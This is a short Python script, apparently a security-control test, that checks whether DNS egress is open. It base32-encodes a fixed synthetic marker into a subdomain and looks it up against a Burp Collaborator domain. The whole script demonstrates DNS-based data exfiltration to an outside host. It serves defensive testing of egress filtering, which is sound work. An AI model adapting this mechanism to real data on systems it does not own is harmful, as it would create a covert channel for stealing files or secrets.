# dns_exfil_probe.py — custom breach method
# CONTROL TEST ONLY. Proves DNS egress carries data-bearing labels off the host.
# Sends one fake-data chunk as a subdomain lookup to your Collaborator domain.
# Not a tunneling tool: single fixed synthetic marker, no file chunking, no persistence.
# ATT&CK: T1048.001 (Exfil Over Unencrypted Non-C2 Protocol / DNS) or T1071.004 (DNS)
#
# Parameters:
#   TARGET_FQDN - your Burp Collaborator domain (authoritative server that logs the lookup)

import os
import base64
import socket


def _param(kwargs, name, default):
    if name in kwargs and kwargs[name] not in (None, ""):
        return kwargs[name]
    return os.environ.get(name, default)


def main(**kwargs):
    collab = _param(kwargs, "TARGET_FQDN",
                    "collaborator endpoint")
    marker = "3530111333300000"  # synthetic, obviously-fake

    if not collab:
        print("DNS_PROBE_ERROR reason=TARGET_FQDN_not_set")
        return 1

    # Encode fake marker into a DNS-safe label (base32), prepend as subdomain.
    label = base64.b32encode(marker.encode()).decode().rstrip("=").lower()
    host = "{}.{}".format(label[:60], collab)

    try:
        socket.gethostbyname(host)  # the lookup itself is the exfil signal
        print("DNS_PROBE_SENT host={}".format(host))
        return 0  # resolution attempt egressed -> data-bearing label left the host
    except socket.gaierror as e:
        # No resolution -> DNS egress likely blocked/filtered for this domain.
        print("DNS_PROBE_BLOCKED reason={}".format(e))
        return 1


if __name__ == "__main__":
    import sys
    sys.exit(main())
